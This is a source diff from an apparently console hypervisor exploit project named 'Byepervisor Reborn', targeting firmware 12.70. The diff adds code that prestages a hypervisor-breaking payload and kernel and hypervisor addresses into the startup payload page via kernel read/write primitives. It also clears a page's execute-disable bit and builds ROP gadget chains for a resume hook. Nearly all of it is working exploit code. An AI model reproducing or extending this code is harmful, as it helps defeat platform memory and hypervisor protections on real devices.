@@ -12,11 +12,60 @@
 #include "util.h"
 #include "paging.h"
 
+uint64_t g_hv_base_pa;
+
 #ifdef AP_DIAGNOSTIC_1270
 #include "break_hv_payload/break_hv_diag.h"
 #define AP_DIAG_DONE    0x415031323730444eULL
 #define AP_DIAG_BAD_PA  0x4150313237304241ULL
 #define AP_DIAG_CARRIER_PA 0x3FFFF000ULL
+#ifdef AP_DIAG_PRESTAGE_1270
+static uint8_t diag_carrier_page[0x1000];
+static uint8_t diag_carrier_verify[0xF00];
+static uint8_t diag_carrier_zero[0x1000];
+
+static int clear_diag_carrier(uint64_t carrier)
+{
+  if (kwrite(carrier, diag_carrier_zero, sizeof(diag_carrier_zero)) != 0 ||
+      kread(carrier, diag_carrier_page, sizeof(diag_carrier_page)) != 0 ||
+      memcmp(diag_carrier_page, diag_carrier_zero,
+             sizeof(diag_carrier_page)) != 0)
+    return -1;
+  return 0;
+}
+
+static int prestage_diag_carrier(uint64_t carrier, uint64_t oracle)
+{
+  if (kread(carrier, diag_carrier_page, sizeof(diag_carrier_page)) != 0)
+    return -1;
+  for (size_t i = 0; i < sizeof(diag_carrier_page); i++) {
+    if (diag_carrier_page[i] != 0)
+      return -2;
+  }
+
+  uint64_t params[6] = {
+    kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR),
+    kdldmap(0), oracle, g_hv_base_pa,
+    g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE),
+    g_hv_base_pa + rawoff(HV_SYM_PCPUS)
+  };
+  if (kwrite(carrier, break_hv, break_hv_len) != 0 ||
+      kwrite(carrier + 0xF00, params, sizeof(params)) != 0) {
+    clear_diag_carrier(carrier);
+    return -3;
+  }
+
+  uint64_t params_verify[6] = {0};
+  if (kread(carrier, diag_carrier_verify, break_hv_len) != 0 ||
+      memcmp(diag_carrier_verify, break_hv, break_hv_len) != 0 ||
+      kread(carrier + 0xF00, params_verify, sizeof(params_verify)) != 0 ||
+      memcmp(params_verify, params, sizeof(params)) != 0) {
+    clear_diag_carrier(carrier);
+    return -4;
+  }
+  return 0;
+}
+#endif
 #else
 #include "break_hv_payload/break_hv.h"
 #endif
@@ -32,8 +81,6 @@
 
 #define HV_LOADER_PA_REGULAR      0x062800000
 #define HV_LOADER_PA_PRO          0x8e0800000
-
-uint64_t g_hv_base_pa;
 
 #ifdef AP_DIAGNOSTIC_1270
 static int restore_diag_carrier(uint64_t pmap, uint64_t original)
@@ -109,7 +156,9 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
   kh_chain_t chain;
   uint8_t chain_buf[0x800];
   uint64_t set_rsi;
+#ifndef AP_DIAG_PRESTAGE_1270
   uint64_t oracle;
+#endif
   int ret;
 
   ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
@@ -128,8 +177,9 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
   kh_set_resume_rsi(&hook, set_rsi);
   kh_set_resume_rdx(&hook, cr3);
 
-  oracle = kh_user_data_addr(&hook);
   kh_chain_init(&chain, chain_buf, sizeof chain_buf);
+#ifndef AP_DIAG_PRESTAGE_1270
+  oracle = kh_user_data_addr(&hook);
   kh_chain_store(&chain, oracle, COOKIE_VAL);
 
   kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
@@ -153,6 +203,7 @@ static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
 
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
   kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
+#endif
 
   ret = kh_install(&hook, &chain);
   if (ret) return ret;
@@ -240,6 +291,7 @@ int main(void)
     printf("[!] AP diagnostic is only built for firmware 12.70\n");
     return 2;
   }
+#ifndef AP_DIAG_PRESTAGE_1270
   // Confirmed on 12.70 hardware: both candidate pages are NX. The old
   // diagnostic panicked in the hook path, which uses POP_RDI to arm #DB.
   if (kgadget(KERNEL_GADGET_POP_RDI) == ktext(0xD65548ULL) ||
@@ -248,6 +300,7 @@ int main(void)
     notifyf("12.70 AP diagnostic disabled: invalid gadget offsets");
     return 2;
   }
+#endif
 #else
   if ((fw & 0xffff0000U) == 0x12700000U) {
     printf("[!] 12.70 offsets are staged for review; HV path is disabled\n");
@@ -422,6 +475,7 @@ int main(void)
          db_gate_lo, db_gate_hi, ist6);
     return 6;
   }
+#ifndef AP_DIAG_PRESTAGE_1270
   uint8_t copied_ap[0xF00] = {0};
   if (kwrite(cave + 0x1000, break_hv, break_hv_len) != 0 ||
       kread(cave + 0x1000, copied_ap, break_hv_len) != 0 ||
@@ -429,6 +483,14 @@ int main(void)
     klog("P1270DIAG,1,stop,stage=ap-image-copy\n");
     return 6;
   }
+#else
+  int stage_result = prestage_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE), oracle);
+  if (stage_result != 0) {
+    klog("P1270DIAG,1,stop,stage=carrier-prestage,result=%d\n", stage_result);
+    return 6;
+  }
+  klog("P1270DIAG,1,carrier,prestage=1,bytes=%u\n", break_hv_len);
+#endif
   carrier_pml4e_saved = pml4e;
   CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
   uint64_t carrier_readback = 0;
@@ -436,6 +498,9 @@ int main(void)
       kread(pml4e_addr, &carrier_readback, 8) != 0 ||
       carrier_readback != pml4e) {
     restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
+#ifdef AP_DIAG_PRESTAGE_1270
+    clear_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE));
+#endif
     klog("P1270DIAG,1,stop,stage=carrier-write\n");
     return 7;
   }
@@ -491,6 +556,10 @@ int main(void)
       notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
 #ifdef AP_DIAGNOSTIC_1270
       int restore_result = restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
+#ifdef AP_DIAG_PRESTAGE_1270
+      int clear_result = clear_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE));
+      klog("P1270DIAG,1,carrier,clear_after_install_failure=%d\n", clear_result);
+#endif
       klog("P1270DIAG,1,stop,stage=hook-install,result=%d,carrier_restore=%d\n",
            r, restore_result);
 #endif
